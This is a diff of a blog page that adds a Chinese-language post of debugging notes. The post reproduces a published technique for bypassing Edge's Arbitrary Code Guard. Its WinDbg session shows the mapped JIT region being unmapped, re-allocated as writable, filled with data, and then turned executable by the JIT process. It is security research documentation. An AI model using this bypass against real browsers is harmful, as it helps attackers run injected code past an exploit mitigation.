@@ -12,6 +12,8 @@
     
     <title>
         
+            ACG bypass using UnmapViewOfFile 调试笔记 | 
+        
         b2ahex&#39;s blog
     </title>
 
@@ -65,15 +67,18 @@
     <!-- The Open Graph protocol -->
     <meta property="og:url" content="https://b2ahex.github.io">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="b2ahex&#39;s blog">
+    <meta property="og:title" content="ACG bypass using UnmapViewOfFile 调试笔记 | b2ahex&#39;s blog">
     <meta property="og:image" content="/blog/img/favicon.png" />
     <meta property="og:description" content="">
     
 
     
+        <meta property="article:published_time" content="5月 21, 2018" />
+        <meta property="article:modified_time" content="6月 01, 2018" />
+    
 
     <!-- The Twitter Card protocol -->
-    <meta name="twitter:title" content="b2ahex&#39;s blog">
+    <meta name="twitter:title" content="ACG bypass using UnmapViewOfFile 调试笔记 | b2ahex&#39;s blog">
     <meta name="twitter:description" content="">
     <meta name="twitter:image" content="/blog/img/favicon.png">
     <meta name="twitter:card" content="summary_large_image" />
@@ -81,35 +86,43 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="https://b2ahex.github.io" />
+        <link rel="canonical" href="https://b2ahex.github.io/blog/2018/05/21/ACG bypass using UnmapViewOfFile 调试笔记/index.html" />
     
 
     <!-- Structured-data for SEO -->
     
         
+
+
 <script type="application/ld+json">
 {
-    "@context": "http://schema.org",
-    "@type": "Website",
+    "@context": "https://schema.org",
+    "@type": "Article",
     "publisher": {
         "@type": "Organization",
         "name": "b2ahex&#39;s blog",
         "logo": "/blog/img/favicon.png"
     },
-    "url": "https://b2ahex.github.io/blog/index.html",
-    "image": {
-        "@type": "ImageObject",
-        "url": "/blog/img/favicon.png"
+    "author": {
+        "@type": "Person",
+        "name": "b2ahex",
+        "image": {
+            "@type": "ImageObject",
+            "url": "/blog/img/favicon.png"
+        },
+        "description": "Hi, nice to meet you"
     },
+    "headline": "ACG bypass using UnmapViewOfFile 调试笔记",
+    "url": "https://b2ahex.github.io/blog/2018/05/21/ACG bypass using UnmapViewOfFile 调试笔记/index.html",
+    "datePublished": "5月 21, 2018",
+    "dateModified": "6月 01, 2018",
+    "description": "",
     "mainEntityOfPage": {
         "@type": "WebPage",
         "@id": "https://b2ahex.github.io"
-    },
-    "description": "null"
+    }
 }
 </script>
-
-
 
 
     
@@ -299,416 +312,327 @@
                         </button>
                     
 
-                    <!-- Index Module -->
-<div class="material-index mdl-grid">
+                    <!-- Post TOC -->
+
     
-        <!-- Paradox Header -->
-        <!-- Daily pic -->
-<div class="mdl-card mdl-shadow--2dp daily-pic mdl-cell mdl-cell--8-col index-top-block">
-
-    <!-- Pic & Slogan -->
-    <div class="mdl-card__media mdl-color-text--grey-50" style="background-image:url(/blog/img/daily_pic.png)">
-        <p class="index-top-block-slogan"><a href="#">
-        
-            
-                Hi, nice to meet you
-            
-        
-        </a></p>
-    </div>
-
-    <!-- Avatar & Name -->
-    <div class="mdl-card__supporting-text meta mdl-color-text--grey-600">
-        <!-- Author Avatar -->
-        <div id="author-avatar">
-            <img src="/blog/img/avatar.png" width="32px" height="32px" alt="avatar">
-        </div>
-        <div>
-            <strong>b2ahex</strong>
-        </div>
-    </div>
-</div>
-
-        <!-- Blog info -->
-<div class="mdl-card mdl-shadow--2dp something-else mdl-cell mdl-cell--8-col mdl-cell--4-col-desktop index-top-block">
-
-    <!-- Search -->
-    
-    <!-- Google -->
-    <div class="mdl-textfield mdl-js-textfield mdl-textfield--expandable" method="post" action="">
-        <label id="search-label" class="mdl-button mdl-js-ripple-effect mdl-js-button mdl-button--fab mdl-color--accent mdl-shadow--4dp" for="search">
-            <i class="material-icons mdl-color-text--white" role="presentation">search</i>
-        </label>
-
-        <form autocomplete="off" id="search-form" method="get" action="//google.com/search" accept-charset="UTF-8" class="mdl-textfield__expandable-holder" target="_blank">
-            <input class="mdl-textfield__input search-input" type="search" name="q" id="search" placeholder="">
-            <label id="search-form-label" class="mdl-textfield__label" for="search"></label>
-
-            <input type="hidden" name="sitesearch" value="https://b2ahex.github.io">
-        </form>
-    </div>
-
-
-
-
-
-
-
-    <!-- LOGO -->
-    <div class="something-else-logo mdl-color--white mdl-color-text--grey-600">
-        <a href="#" target="_blank">
-            <img src="/blog/img/logo.png" alt="logo" />
+    <!-- Back Button -->
+    <!--
+    <div class="material-back" id="backhome-div" tabindex="0">
+        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
+           href="#" onclick="window.history.back();return false;"
+           target="_self"
+           role="button"
+           data-upgraded=",MaterialButton,MaterialRipple">
+            <i class="material-icons" role="presentation">arrow_back</i>
+            <span class="mdl-button__ripple-container">
+                <span class="mdl-ripple"></span>
+            </span>
         </a>
     </div>
+    -->
 
-    <!-- Infomation -->
-    <div class="mdl-card__supporting-text meta meta--fill mdl-color-text--grey-600">
-        <!-- Blog Title -->
-        <div>
-            <strong>b2ahex&#39;s blog</strong>
-        </div>
-        <div class="section-spacer"></div>
-
-        <!-- Pages -->
-        <button id="show-pages-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
-            <i class="material-icons" role="presentation">view_carousel</i>
-            <span class="visuallyhidden">Pages</span>
-        </button>
-        <ul class="mdl-menu mdl-js-menu mdl-menu--bottom-right" for="show-pages-button">
-            
-                <a class="index_share-link" href="https://b2ahex.github.io/blog/whoami" title="whoami">
-                    <li class="mdl-menu__item mdl-js-ripple-effect">
-                        whoami
-                    </li>
-                </a>
-            
-        </ul>
-
-        <!-- Menu -->
-        <button id="menubtn" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
-            <i class="material-icons" role="presentation">more_vert</i>
-            <span class="visuallyhidden">show menu</span>
-        </button>
-        <ul class="mdl-menu mdl-js-menu mdl-menu--bottom-right" for="menubtn">
-            
-
-            
-
-            
-                <a class="index_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=b2ahex&#39;s blog&url=https://b2ahex.github.io/blog/&pic=&searchPic=false&style=simple" target="_blank">
-                    <li class="mdl-menu__item mdl-js-ripple-effect">
-                        分享到微博
-                    </li>
-                </a>
-            
-
-            
-                <a class="index_share-link" href="https://twitter.com/intent/tweet?text=b2ahex&#39;s blog&url=https://b2ahex.github.io/blog/&via=b2ahex" target="_blank">
-                    <li class="mdl-menu__item mdl-js-ripple-effect">
-                        分享到 Twitter
-                    </li>
-                </a>
-            
-
-            
-                <a class="index_share-link" href="https://www.facebook.com/sharer/sharer.php?u=https://b2ahex.github.io/blog/index.html" target="_blank">
-                    <li class="mdl-menu__item mdl-js-ripple-effect">
-                        分享到 Facebook
-                    </li>
-                </a>
-            
-
-            
-                <a class="index_share-link" href="https://plus.google.com/share?url=https://b2ahex.github.io/blog/" target="_blank">
-                    <li class="mdl-menu__item mdl-js-ripple-effect">
-                        分享到 Google+
-                    </li>
-                </a>
-            
-
-            
-
-            
-
-            
-        </ul>
-    </div>
-</div>
+    <!-- Left aligned menu below button -->
+    <button id="post-toc-trigger-btn"
+        class="mdl-button mdl-js-button mdl-button--icon">
+        <i class="material-icons">format_list_numbered</i>
+    </button>
 
     
-    <div class="locate-thumbnail-symbol"></div>
-
-    <!-- Pin on top -->
+    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#1-背景介绍"><span class="post-toc-number">1.</span> <span class="post-toc-text">1. 背景介绍</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#2-利用流程"><span class="post-toc-number">2.</span> <span class="post-toc-text">2. 利用流程</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#3-上调试器"><span class="post-toc-number">3.</span> <span class="post-toc-text">3. 上调试器</span></a></li></ol>
+        <!--
+        <li class="mdl-menu__item">
+            Some Action
+        </li>
+        -->
+    </ul>
     
 
-    <!-- Normal Post -->
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
+
+
+
+
+<!-- Layouts -->
+
+    <!-- Post Module -->
+    <div class="material-post_container">
+
+        <div class="material-post mdl-grid">
+            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+
+                <!-- Post Header(Thumbnail & Title) -->
+                
+    <!-- Paradox Post Header -->
     
         
             <!-- Random Thumbnail -->
             <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
+            <script type="text/ls-javascript" id="post-thumbnail-script">
+    var randomNum = Math.floor(Math.random() * 19 + 1);
 
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/blog/2018/05/21/ACG bypass using UnmapViewOfFile 调试笔记/">ACG bypass using UnmapViewOfFile 调试笔记</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            作者：b2ahex  
-
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/blog/2018/05/21/ACG bypass using UnmapViewOfFile 调试笔记/" target="_self">阅读全文</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/blog/img/avatar.png" width="44px" height="44px" alt="b2ahex's avatar">
-            </div>
-            <div>
-                <strong>b2ahex</strong>
-                <span>5月 21, 2018</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-            <!-- Category -->
-            <span class="post_entry-category">
-                
-            </span>
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
-    
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
-
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/blog/2018/05/15/8120分析/">CVE-2018-8120 漏洞分析</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            作者：b2ahex
-
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/blog/2018/05/15/8120分析/" target="_self">阅读全文</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/blog/img/avatar.png" width="44px" height="44px" alt="b2ahex's avatar">
-            </div>
-            <div>
-                <strong>b2ahex</strong>
-                <span>5月 15, 2018</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-            <!-- Category -->
-            <span class="post_entry-category">
-                
-            </span>
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
-    
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
-
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/blog/2017/06/13/4113分析/">CVE-2014-4113 漏洞利用分析</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            作者：b2ahex
-1. 背景介绍
-win32k.sys in the kernel-mode drivers in Microsoft Windows Server 2003 SP2, Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows 7 SP1, Windows 8, Windows 8.1, Windows Server 2012 Gold and R2, and Windows RT Gold and 8.1 allows local users to gain privileges via a crafted application, as exploited in the wild in October 2014, aka “Win32k.sys Elevation of Privilege Vulnerability.”  
-
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/blog/2017/06/13/4113分析/" target="_self">阅读全文</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/blog/img/avatar.png" width="44px" height="44px" alt="b2ahex's avatar">
-            </div>
-            <div>
-                <strong>b2ahex</strong>
-                <span>6月 13, 2017</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-            <!-- Category -->
-            <span class="post_entry-category">
-                
-            </span>
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
-    
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
-
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/blog/2014/08/08/利用kaspersky白文件的恶意样本分析/">利用kaspersky白文件的恶意样本分析</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            之前分析过的样本，随便贴点东西上来吧…
-by @b2ahex
-一、样本信息
-样本名称：280836636_37EEC1A29D316ED1E5E766B599DC32A1.bin样本大小： 64,599 字节文件类型：EXE文件病毒名称：HttpBrowser样本MD5： 37eec1a29d316ed1e5e766b599dc32a1样本SHA256：a89c21dd608c51c4bf0323d640f816e464578510389f9edcf04cd34090decc91
-
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/blog/2014/08/08/利用kaspersky白文件的恶意样本分析/" target="_self">阅读全文</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/blog/img/avatar.png" width="44px" height="44px" alt="b2ahex's avatar">
-            </div>
-            <div>
-                <strong>b2ahex</strong>
-                <span>8月 08, 2014</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-            <!-- Category -->
-            <span class="post_entry-category">
-                
-            </span>
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-
-    
-
-    
-        <script type="text/ls-javascript" id="thumbnail-script">
-    var randomNum;
-
-    var locatePost = $('.locate-thumbnail-symbol').next();
-    for(var i = 0; i < 10; i++) {
-        randomNum = Math.floor(Math.random() * 19 + 1);
-
-        locatePost.children('.post_thumbnail-random').attr('id', 'random_thumbnail-'+randomNum);
-        locatePost.children('.post_thumbnail-random').attr('data-original', '/blog/img/random/material-' + randomNum + '.png');
+    $('.post_thumbnail-random').attr('data-original', '/blog/img/random/material-' + randomNum + '.png');
     $('.post_thumbnail-random').addClass('lazy');
-
-        locatePost = locatePost.next();
-    }
 </script>
 
+        
+    
+            <p class="article-headline-p">
+                ACG bypass using UnmapViewOfFile 调试笔记
+            </p>
+        </div>
+
+
+
+
+
+                
+                    <!-- Paradox Post Info -->
+                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
+
+    <!-- Author Avatar -->
+    <div id="author-avatar">
+        <img src="/blog/img/avatar.png" width="44px" height="44px" alt="Author Avatar"/>
+    </div>
+    <!-- Author Name & Date -->
+    <div>
+        <strong>b2ahex</strong>
+        <span>5月 21, 2018</span>
+    </div>
+
+    <div class="section-spacer"></div>
+
+    <!-- Favorite -->
+    <!--
+        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
+            <i class="material-icons" role="presentation">favorite</i>
+            <span class="visuallyhidden">favorites</span>
+        </button>
+    -->
+
+    <!-- Qrcode -->
+    
+
+    <!-- Tags (bookmark) -->
+    
+    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+        <i class="material-icons" role="presentation">bookmark</i>
+        <span class="visuallyhidden">bookmark</span>
+    </button>
+    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
+        <li class="mdl-menu__item">
+        
+    </ul>
+    
+
+    <!-- Share -->
+    <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">share</i>
+    <span class="visuallyhidden">share</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
+    
+
+    
+
+    <!-- Share Weibo -->
+    
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=ACG bypass using UnmapViewOfFile 调试笔记&url=https://b2ahex.github.io/blog/2018/05/21/ACG bypass using UnmapViewOfFile 调试笔记/index.html&pic=&searchPic=false&style=simple" target="_blank">
+            <li class="mdl-menu__item">
+                分享到微博
+            </li>
+        </a>
+    
+
+    <!-- Share Twitter -->
+    
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=ACG bypass using UnmapViewOfFile 调试笔记&url=https://b2ahex.github.io/blog/2018/05/21/ACG bypass using UnmapViewOfFile 调试笔记/index.html&via=b2ahex" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Twitter
+            </li>
+        </a>
+    
+
+    <!-- Share Facebook -->
+    
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=https://b2ahex.github.io/blog/2018/05/21/ACG bypass using UnmapViewOfFile 调试笔记/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Facebook
+            </li>
+        </a>
+    
+
+    <!-- Share Google+ -->
+    
+        <a class="post_share-link" href="https://plus.google.com/share?url=https://b2ahex.github.io/blog/2018/05/21/ACG bypass using UnmapViewOfFile 调试笔记/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Google+
+            </li>
+        </a>
+    
+
+    <!-- Share LinkedIn -->
+    
+
+    <!-- Share QQ -->
+    
+
+    <!-- Share Telegram -->
+    
+</ul>
+
+</div>
+
+                
+
+                <!-- Post Content -->
+                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+    
+        <p>作者：b2ahex  </p>
+<h3 id="1-背景介绍"><a href="#1-背景介绍" class="headerlink" title="1. 背景介绍"></a>1. 背景介绍</h3><p>测试 <em>project-zero</em> 研究员ifratric提出的绕过ACG缓解的方法,原文:<em><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1435" title="ACG bypass using UnmapViewOfFile" target="_blank" rel="external">ACG bypass using UnmapViewOfFile</a></em> </p>
+<p>系统加入ACG(Arbitrary Code Guard) 缓解之后把脚本引擎的JIT编译功能放到一个单独的Edge进程中,当渲染进程需要执行JIT功能时通过RPC将目标字节码发送到JIT进程,由JIT进程编译生成本地代码并将其映射回原来的请求进程中执行。</p>
+<h3 id="2-利用流程"><a href="#2-利用流程" class="headerlink" title="2. 利用流程"></a>2. 利用流程</h3><p>JIT进程写回本地代码之前有如下几个步骤:<br>a.使用 <em>CreateFileMapping()</em> 创建内存映像对象<br>b.使用 <em>MapViewOfFile2()</em> 将它映射到请求进程中,在请求进程中的内存标志为RESERVE,不包含可写属性<br>c.当JIT进程需要写入数据时调用 <em>VirtualAllocEx()</em> 从之前映射的内存中申请内存,即使内存已经分配也会调用成功,包含 <em>PAGE_EXECUTE</em>  </p>
+<p>获取可执行内存思路:<br>在JIT进程调用 <em>VirtualAllocEx()</em> 之前停止内存映射(<em>UnmapViewOfFile</em>),在相同位置申请虚拟内存标记可写,写入shellcode到一个合理的位置,由JIT进程调用 <em>VirtualAllocEx()</em> 将这段内存改回可执行标志。    </p>
+<h3 id="3-上调试器"><a href="#3-上调试器" class="headerlink" title="3. 上调试器"></a>3. 上调试器</h3><p>调试记录如下：  </p>
+<pre><code>附加JIT进程
+0:018&gt; bp kernelbase!virtualallocex
+0:018&gt; g
+Breakpoint 0 hit
+KERNELBASE!VirtualAllocEx:
+00007ffc`1d25e170 4883ec38        sub     rsp,38h
+0:009&gt; k
+ # Child-SP          RetAddr           Call Site
+00 00000080`f01fd648 00007ffc`12583104 KERNELBASE!VirtualAllocEx
+01 00000080`f01fd650 00007ffc`00422dcd EShims!NS_ACGLockdownTelemetry::APIHook_VirtualAllocEx+0x14
+02 00000080`f01fd690 00007ffc`0042203e chakra!Memory::PreReservedSectionAllocWrapper::Alloc+0xd5
+03 00000080`f01fd710 00007ffc`0040564e chakra!Memory::HeapPageAllocator&lt;Memory::PreReservedSectionAllocWrapper&gt;::CreateSecondaryAllocator+0x5e
+04 00000080`f01fd750 00007ffc`00405548 chakra!Memory::SegmentBase&lt;Memory::PreReservedSectionAllocWrapper&gt;::Initialize+0xe6
+05 00000080`f01fd7b0 00007ffc`004224b8 chakra!Memory::PageAllocatorBase&lt;Memory::PreReservedSectionAllocWrapper,Memory::SegmentBase&lt;Memory::PreReservedSectionAllocWrapper&gt;,Memory::PageSegmentBase&lt;Memory::PreReservedSectionAllocWrapper&gt; &gt;::AllocPageSegment+0xa8
+06 00000080`f01fd810 00007ffc`00421e7a chakra!Memory::PageAllocatorBase&lt;Memory::PreReservedSectionAllocWrapper,Memory::SegmentBase&lt;Memory::PreReservedSectionAllocWrapper&gt;,Memory::PageSegmentBase&lt;Memory::PreReservedSectionAllocWrapper&gt; &gt;::SnailAllocPages&lt;1&gt;+0xa0
+07 00000080`f01fd8d0 00007ffc`00421488 chakra!Memory::CustomHeap::CodePageAllocators&lt;Memory::SectionAllocWrapper,Memory::PreReservedSectionAllocWrapper&gt;::AllocPages+0x72
+08 00000080`f01fd940 00007ffc`00421210 chakra!Memory::CustomHeap::Heap&lt;Memory::SectionAllocWrapper,Memory::PreReservedSectionAllocWrapper&gt;::AllocNewPage+0x68
+09 00000080`f01fd9c0 00007ffc`00420e14 chakra!Memory::CustomHeap::Heap&lt;Memory::SectionAllocWrapper,Memory::PreReservedSectionAllocWrapper&gt;::Alloc+0x9c
+0a 00000080`f01fda70 00007ffc`00420cae chakra!EmitBufferManager&lt;Memory::SectionAllocWrapper,Memory::PreReservedSectionAllocWrapper,CriticalSection&gt;::NewAllocation+0x58
+0b 00000080`f01fdb00 00007ffc`005299dc chakra!JITOutput::RecordOOPNativeCodeSize+0x8e
+0c 00000080`f01fdb90 00007ffc`00575506 chakra!Encoder::Encode+0x9dc
+0d 00000080`f01fdd10 00007ffc`006604e5 chakra!Func::TryCodegen+0x356
+0e 00000080`f01fe5b0 00007ffc`0044c00e chakra!Func::Codegen+0xed
+0f 00000080`f01fe9e0 00007ffc`0044be54 chakra!&lt;lambda_869fb2da08ff617a0f58153cb1331989&gt;::operator()+0x166
+10 00000080`f01feb00 00007ffc`0044bde2 chakra!ServerCallWrapper&lt;&lt;lambda_869fb2da08ff617a0f58153cb1331989&gt; &gt;+0x54
+11 00000080`f01feb50 00007ffc`0044bd85 chakra!ServerCallWrapper&lt;&lt;lambda_869fb2da08ff617a0f58153cb1331989&gt; &gt;+0x4e
+12 00000080`f01febc0 00007ffc`201a6d13 chakra!ServerRemoteCodeGen+0x75
+13 00000080`f01fec30 00007ffc`20209390 RPCRT4!Invoke+0x73
+14 00000080`f01fec90 00007ffc`20133718 RPCRT4!Ndr64StubWorker+0xbb0
+15 00000080`f01ff340 00007ffc`201573b4 RPCRT4!NdrServerCallNdr64+0x38
+16 00000080`f01ff390 00007ffc`2015654e RPCRT4!DispatchToStubInCNoAvrf+0x24
+17 00000080`f01ff3e0 00007ffc`20156f84 RPCRT4!RPC_INTERFACE::DispatchToStubWorker+0x1be
+18 00000080`f01ff4b0 00007ffc`20160693 RPCRT4!RPC_INTERFACE::DispatchToStubWithObject+0x154
+19 00000080`f01ff550 00007ffc`20161396 RPCRT4!LRPC_SCALL::DispatchRequest+0x183
+1a 00000080`f01ff630 00007ffc`2015d11e RPCRT4!LRPC_SCALL::HandleRequest+0x996
+1b 00000080`f01ff740 00007ffc`2015e843 RPCRT4!LRPC_ADDRESS::HandleRequest+0x34e
+1c 00000080`f01ff7f0 00007ffc`2018cc58 RPCRT4!LRPC_ADDRESS::ProcessIO+0x8a3
+1d 00000080`f01ff930 00007ffc`202b65ae RPCRT4!LrpcIoComplete+0xd8
+1e 00000080`f01ff9d0 00007ffc`202b4b26 ntdll!TppAlpcpExecuteCallback+0x22e
+1f 00000080`f01ffa50 00007ffc`1f801fe4 ntdll!TppWorkerThread+0x886
+20 00000080`f01ffde0 00007ffc`202eef91 KERNEL32!BaseThreadInitThunk+0x14
+21 00000080`f01ffe10 00000000`00000000 ntdll!RtlUserThreadStart+0x21
+0:009&gt; r
+rax=0000000040000010 rbx=0000020e8001e000 rcx=000000000000064c
+rdx=0000020e8001e000 rsi=0000000000000001 rdi=00000216a0524ca0
+rip=00007ffc1d25e170 rsp=00000080f01fd648 rbp=00000216a0524ea8
+ r8=0000000000002000  r9=0000000000001000 r10=00000216a0525250
+r11=1000000000000000 r12=00000216a0525128 r13=0000000000001000
+r14=0000020e80000000 r15=0000000000000000
+iopl=0         nv up ei pl nz na po nc
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206  
+</code></pre><p>确认在 <em>chakra!ServerRemoteCodeGen</em> 流程中,rdx(0000020e8001e000)是申请页面的虚拟地址,再开一个windbg附加到渲染进程,查看这个地址内存信息:</p>
+<pre><code>0:028&gt; !address 0000020e8001e000 
+Usage:                  MappedFile
+Base Address:           0000020e`80000000
+End Address:            0000020e`90000000
+Region Size:            00000000`10000000 ( 256.000 MB)
+State:                  00002000          MEM_RESERVE
+Protect:                &lt;info not present at the target&gt;
+Type:                   00040000          MEM_MAPPED
+Allocation Base:        0000020e`80000000
+Allocation Protect:     00000010          PAGE_EXECUTE
+Mapped file name:       PageFile  
+</code></pre><p>此时状态不可写,无法写入数据,Unmap掉这段内存,重新申请并标记 <em>PAGE_READWRITE</em>  </p>
+<pre><code>0:028&gt; r rip=kernelbase!unmapviewoffile
+0:028&gt; r rcx=0000020e`80000000
+0:028&gt; p
+...
+
+0:028&gt; !address 0000020e8001e000 
+Usage:                  Free
+Base Address:           0000004b`c3b50000
+End Address:            0000020e`f0a50000
+Region Size:            000001c3`2cf00000 (   1.762 TB)
+State:                  00010000          MEM_FREE
+Protect:                00000001          PAGE_NOACCESS
+Type:                   &lt;info not present at the target&gt;
+
+0:028&gt; r rip=kernelbase!virtualalloc
+0:028&gt; r rcx=0000020e8001e000
+0:028&gt; r rdx=2000
+0:028&gt; r r8=3000
+0:028&gt; r r9=4
+0:028&gt; p
+...
+KERNELBASE!VirtualAlloc+0x5c:
+00007ffc`1d24e03c c3              ret
+0:028&gt; r rax
+rax=0000020e80010000
+0:028&gt; !address 0000020e8001e000 
+Usage:                  &lt;unknown&gt;
+Base Address:           0000020e`80010000
+End Address:            0000020e`80020000
+Region Size:            00000000`00010000 (  64.000 kB)
+State:                  00001000          MEM_COMMIT
+Protect:                00000004          PAGE_READWRITE
+Type:                   00020000          MEM_PRIVATE
+Allocation Base:        0000020e`80010000
+Allocation Protect:     00000004          PAGE_READWRITE
+</code></pre><p>向原地址写入测试数据:<br><img src="/blog/img/src/acg_unmap1.png" alt="">   </p>
+<p>回到JIT进程执行<em>VirtualAllocEx()</em>,再次查看原地址内存信息:<br><img src="/blog/img/src/acg_unmap2.png" alt="">  </p>
+<p>此时我们写入的数据还在,同时内存变为<em>PAGE_EXECUTE</em></p>
+
+    
+
     
 </div>
+
+
+                
+
+                <!-- Post Comments -->
+                
+                    
+                
+            </div>
+
+            <!-- Post Prev & Next Nav -->
+            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+    <!-- Prev Nav -->
+    
+
+    <!-- Section Spacer -->
+    <div class="section-spacer"></div>
+
+    <!-- Next Nav -->
+    
+        <a href="/blog/2018/05/15/8120分析/" id="post_nav-older" class="next-content">
+            旧篇
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
+    
+</nav>
+
+        </div>
+    </div>
+
 
 
                     
@@ -994,12 +918,6 @@ It will not impact the appearance and can give developers a lot of support :)
 
 
 
-
-    <!-- Swiftye -->
-    
-
-    <!-- Local Search-->
-    
 
 
 <!-- UC Browser Compatible -->
